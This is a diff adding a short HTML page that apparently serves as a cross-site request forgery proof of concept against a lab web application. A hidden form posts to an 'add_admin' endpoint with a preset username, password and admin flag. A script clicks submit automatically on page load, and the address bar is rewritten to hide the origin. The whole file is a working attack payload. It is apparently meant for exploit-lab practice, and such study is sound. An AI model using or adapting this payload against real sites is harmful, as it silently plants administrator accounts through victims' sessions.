@@ -1,0 +1,15 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://docker.lab.ns.exploitlab.net:13057/add_admin">
+      <input type="hidden" name="username" value="tirth" />
+      <input type="hidden" name="password" value="tirth" />
+      <input type="hidden" name="isAdmin" value="yes" />
+      <input type="hidden" name="submit" value="Add&#32;User" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementsByTagName('input')[4].click();
+    </script>
+  </body>
+</html>
